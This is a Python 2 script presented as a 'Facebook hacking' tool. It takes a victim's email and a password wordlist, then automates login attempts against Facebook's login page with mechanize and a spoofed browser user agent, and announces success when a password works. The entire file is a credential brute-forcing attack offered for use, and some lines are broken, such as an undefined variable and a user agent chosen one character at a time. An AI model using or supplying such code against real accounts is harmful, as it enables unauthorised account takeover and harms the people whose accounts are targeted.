#!/usr/bin/env python
# -*- coding: UTF-8 -*-
	
	
import os
import sys
import mechanize
import cookielib
import random 
import time

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     P = random.choice(rand)
def cover():
    print """
    
    
    
    
     """
    time.sleep(1)
    print " "
    print "  +           NO MORE SAY HACKING,              +"
    print "                JUST SAY NIKED                  "
    print "  +      lets make this cyber world safe.       +"    
    print "  +              FACEBOOK NIKED                 +"
    print "                                                  "
cover()
    
email = str(raw_input(" Enter your email to be hacked "))

passwordlist = str(raw_input(" Select the password list [ nik.txt, nik1.txt, nik2.txt, nik3.txt ] "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25'


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print " "
        runntek("  Wordlist Doesn't Match")
        runntek("  Develop Your Own Wordlist ")
        time.sleep(1)
        print "  -"
        kol()

def kol():
    nok = raw_input("Edit wordlist .? \033[96;1m[y/n]: ")
    if nok == "y":
        print ("Please write the command \033[92;1m[nano pass.txt] !")
        print (41*"-")
        print (" ")
        os.sys.exit()
    else:
        exit(0)
def brute(password):
        sys.stdout.write("\r[+]\033[97;1m Finding..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Password Found \033[31;1m===| \033[96;1m{}".format(password)) 
                        print " "
                        raw_input("PRESS ENTER TO EXIT .....")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        wel = """


      """
        print wel
        print " "
        total = open(passwordlist,"r")
        total = total.readlines()
        print " "
        print " * Email : {}".format(email)
        print " * no.of attempts :" , len(total),"passwords"
        print " * Niking, on process  .....\n\n"

if __name__ == '__main__':
        main()
